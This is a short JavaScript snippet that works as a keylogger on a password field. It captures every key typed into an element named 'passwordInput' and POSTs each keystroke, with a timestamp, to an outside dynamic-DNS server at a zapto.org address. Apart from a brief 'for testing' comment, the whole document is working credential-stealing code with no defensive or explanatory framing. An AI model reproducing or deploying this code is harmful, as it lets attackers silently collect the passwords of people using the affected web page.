document.getElementById('passwordInput').addEventListener('keyup', function(e) {
    var loggedData = {
        key: e.key,
        timestamp: new Date().toISOString()
    };
    console.log(loggedData);  // For testing, logs to the console
    fetch('https://arcadiuz2214.zapto.org/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(loggedData)
    }).then(response => response.json())
      .then(data => console.log('Success:', data))
      .catch((error) => console.error('Error:', error));
});
